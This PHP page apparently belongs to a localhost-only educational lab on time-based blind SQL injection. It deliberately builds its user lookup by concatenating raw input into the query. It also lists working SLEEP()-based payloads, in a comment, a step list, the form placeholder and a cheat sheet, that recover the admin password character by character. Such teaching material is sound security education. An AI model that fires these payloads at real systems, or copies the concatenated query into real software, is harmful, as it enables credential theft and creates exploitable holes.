<?php
// ============================================================
// timebased_vulnerable.php - Time-Based Blind SQL Injection Demo
// SQL Injection Educational Lab
// FOR EDUCATIONAL PURPOSES ONLY - localhost only
// ============================================================
//
// VULNERABILITY: Time-based blind SQL injection using SLEEP()
// -----------------------------------------------------------
// When no visible output or true/false difference exists, an
// attacker can use SLEEP() or BENCHMARK() to infer information
// based on response time.
//
// Example payload:
//   admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) --
//
// If the first char of admin's password is 'a', the response
// will be delayed by ~2 seconds. Otherwise it responds instantly.
// ============================================================

require_once 'db.php';
require_once 'lang_switcher.php';
$_SESSION['visited_labs'][] = 'timebased_vulnerable'; $_SESSION['visited_labs'] = array_unique($_SESSION['visited_labs']);

$response      = null;
$query         = '';
$errorDetail   = '';
$elapsed       = 0;
$userCount     = 0;

// Handle reset
if (isset($_POST['reset'])) {
    resetUsersTable();
}

// Count users
try {
    $pdo = getDB();
    $userCount = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
} catch (PDOException $e) { /* ignore */ }

// Handle check
if (isset($_POST['check'])) {
    $username = $_POST['username'] ?? '';

    // VULNERABLE: Direct string concatenation
    $query = "SELECT * FROM users WHERE username='$username'";

    try {
        $pdo   = getDB();
        $start = microtime(true);
        $stmt  = $pdo->query($query);
        $result = $stmt->fetchAll();
        $elapsed = round(microtime(true) - $start, 2);
        $response = ($elapsed >= 1.5) ? 'DELAYED' : (count($result) > 0 ? 'INSTANT_TRUE' : 'INSTANT_FALSE');
    } catch (PDOException $e) {
        $response = 'ERROR';
        $errorDetail = $e->getMessage();
        $elapsed = 0;
    }
}
?>
<!DOCTYPE html>
<html lang="<?= t('lang_code') ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= t('timebased_page') ?></title>
    <style>
        <?= langSwitcherCSS() ?>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: #e0e0e0; min-height: 100vh; }
        .container { max-width: 750px; margin: 0 auto; padding: 40px 20px; }
        a.back { color: #00e5ff; text-decoration: none; font-size: 0.9rem; }
        a.back:hover { text-decoration: underline; }
        h1 { color: #ff5252; margin: 16px 0 4px; }
        .tag { display: inline-block; background: #b71c1c; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; font-weight: bold; margin-bottom: 16px; }
        .info-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; line-height: 1.6; font-size: 0.9rem; }
        .info-box code { display: block; background: #0d0d1a; padding: 6px 10px; border-radius: 4px; color: #ff8a80; margin: 6px 0; font-size: 0.85rem; word-break: break-all; }
        .step-list { margin: 12px 0; padding-left: 20px; }
        .step-list li { margin-bottom: 8px; }
        .step-list li code { display: inline; margin: 0; }
        form { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #aaa; }
        input[type="text"] {
            width: 100%; padding: 10px 12px; margin-bottom: 16px; border: 1px solid #333;
            border-radius: 6px; background: #0d0d1a; color: #e0e0e0; font-size: 0.95rem;
        }
        .btn-row { display: flex; gap: 12px; }
        button { padding: 10px 24px; border: none; border-radius: 6px; font-weight: bold; font-size: 0.95rem; cursor: pointer; }
        button[name="check"] { background: #c62828; color: #fff; }
        button[name="check"]:hover { background: #e53935; }
        button[name="reset"] { background: #37474f; color: #fff; }
        button[name="reset"]:hover { background: #546e7a; }
        .query-box { background: #0d0d1a; border: 1px solid #333; border-radius: 6px; padding: 14px; margin-bottom: 20px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #ffab91; word-break: break-all; }
        .query-box span { color: #666; }
        .response-box { text-align: center; padding: 32px; border-radius: 8px; margin-bottom: 24px; font-size: 1.4rem; font-weight: bold; }
        .response-box.delayed  { background: #e6510033; color: #ffab40; border: 2px solid #e65100; }
        .response-box.instant  { background: #1b5e2033; color: #69f0ae; border: 2px solid #2e7d32; }
        .response-box.error    { background: #b71c1c33; color: #ff5252; border: 2px solid #c62828; }
        .response-box small { display: block; font-size: 0.8rem; font-weight: normal; margin-top: 6px; color: #aaa; }
        .timer { font-size: 2rem; color: #ffab40; text-align: center; margin-bottom: 8px; font-family: 'Courier New', monospace; }
        .db-status { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 6px; padding: 10px 14px; margin-bottom: 16px; font-size: 0.85rem; }
        .db-status.ok { border-color: #2e7d32; color: #69f0ae; }
        .db-status.empty { border-color: #c62828; color: #ff5252; }
        .cheat-sheet { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; }
        .cheat-sheet h3 { color: #00e5ff; margin-bottom: 12px; font-size: 1rem; }
        .cheat-sheet table { width: 100%; border-collapse: collapse; }
        .cheat-sheet th, .cheat-sheet td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #2a2a4a; font-size: 0.82rem; }
        .cheat-sheet th { color: #888; }
        .cheat-sheet td code { color: #ff8a80; }
        .delayed-mark { color: #ffab40; font-weight: bold; }
        .instant-mark { color: #69f0ae; }
    </style>
</head>
<body>
<?= langSwitcherHTML() ?>
<div class="container">
    <a class="back" href="index.php"><?= t('back_to_menu') ?></a>
    <h1><?= t('timebased_title') ?></h1>
    <span class="tag"><?= t('vulnerable') ?></span>

    <!-- Database status -->
    <?php if ($userCount > 0): ?>
        <div class="db-status ok"><?= sprintf(t('db_users_count'), $userCount) ?></div>
    <?php else: ?>
        <div class="db-status empty"><?= t('db_table_empty') ?></div>
    <?php endif; ?>

    <!-- Explanation -->
    <div class="info-box">
        <?= t('timebased_what') ?><br><br>
        <?= t('timebased_technique') ?>
        <ol class="step-list">
            <li><?= t('timebased_step1') ?><br>
                <code>admin' AND IF(1=1, SLEEP(2), 0) -- </code> <?= t('timebased_step1_result') ?></li>
            <li><?= t('timebased_step2') ?><br>
                <code>admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) -- </code> <?= t('timebased_step2_result') ?></li>
            <li><?= t('timebased_step3') ?><br>
                <code>admin' AND IF(SUBSTRING(password,2,1)='d', SLEEP(2), 0) -- </code> <?= t('timebased_step3_result') ?></li>
            <li><?= t('timebased_step4') ?></li>
        </ol>
    </div>

    <!-- Form -->
    <form method="POST">
        <label for="username"><?= t('timebased_input_label') ?></label>
        <input type="text" id="username" name="username"
               placeholder="admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) -- "
               value="<?= htmlspecialchars($_POST['username'] ?? '') ?>">
        <div class="btn-row">
            <button type="submit" name="check" value="1"><?= t('timebased_send_btn') ?></button>
            <button type="submit" name="reset" value="1"><?= t('reset_database') ?></button>
        </div>
    </form>

    <?php if ($response !== null): ?>
        <!-- Show the executed query -->
        <div class="query-box">
            <span><?= t('executed_sql') ?></span><br>
            <?= htmlspecialchars($query) ?>
        </div>

        <!-- Timer display -->
        <div class="timer">&#9201; <?= $elapsed ?>s</div>

        <!-- Response -->
        <?php if ($response === 'DELAYED'): ?>
            <div class="response-box delayed">
                <?= t('timebased_delayed') ?>
                <small><?= sprintf(t('timebased_delayed_detail'), $elapsed) ?></small>
            </div>
        <?php elseif ($response === 'INSTANT_TRUE' || $response === 'INSTANT_FALSE'): ?>
            <div class="response-box instant">
                <?= t('timebased_instant') ?>
                <small><?= sprintf(t('timebased_instant_detail'), $elapsed) ?></small>
            </div>
        <?php else: ?>
            <div class="response-box error">
                <?= t('error_sql_syntax') ?>
                <small><?= htmlspecialchars($errorDetail) ?></small>
            </div>
        <?php endif; ?>
    <?php endif; ?>

    <!-- Cheat sheet -->
    <div class="cheat-sheet">
        <h3><?= t('timebased_cheat_title') ?></h3>
        <p style="color:#aaa; font-size:0.82rem; margin-bottom:12px;">
            <?= t('timebased_cheat_desc') ?>
        </p>
        <table>
            <tr><th><?= t('payload') ?></th><th><?= t('expected') ?></th></tr>
            <tr>
                <td><code>admin' AND IF(1=1, SLEEP(2), 0) -- </code></td>
                <td><span class="delayed-mark">~2s <?= t('timebased_delay_word') ?></span></td>
            </tr>
            <tr>
                <td><code>admin' AND IF(1=2, SLEEP(2), 0) -- </code></td>
                <td><span class="instant-mark"><?= t('timebased_instant_word') ?></span></td>
            </tr>
            <tr>
                <td><code>admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) -- </code></td>
                <td><span class="delayed-mark">~2s <?= t('timebased_delay_word') ?> (a=&#10003;)</span></td>
            </tr>
            <tr>
                <td><code>admin' AND IF(SUBSTRING(password,1,1)='b', SLEEP(2), 0) -- </code></td>
                <td><span class="instant-mark"><?= t('timebased_instant_word') ?> (b=&#10007;)</span></td>
            </tr>
            <tr>
                <td><code>admin' AND IF(LENGTH(password)=8, SLEEP(2), 0) -- </code></td>
                <td><span class="delayed-mark">~2s <?= t('timebased_delay_word') ?> (len=8 &#10003;)</span></td>
            </tr>
        </table>
    </div>
</div>
</body>
</html>
